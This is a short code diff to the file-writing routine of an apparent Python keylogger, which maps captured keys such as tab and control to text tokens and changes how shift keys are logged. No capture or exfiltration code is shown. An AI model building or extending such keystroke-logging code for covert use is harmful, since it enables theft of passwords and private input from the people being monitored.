@@ -56,11 +56,11 @@ def write_file(keys):
             elif key == Key.tab:
                 f.write("[TAB]")
 
-            # elif key == Key.shift:
-                # f.write("[SHIFT]")
+            elif key == Key.shift:
+                f.write("")
 
             elif key == Key.shift_r:
-                f.write("[SHIFT_R]")
+                f.write("")
 
             elif key == Key.ctrl_l:
                 f.write("[CTRL_L]")
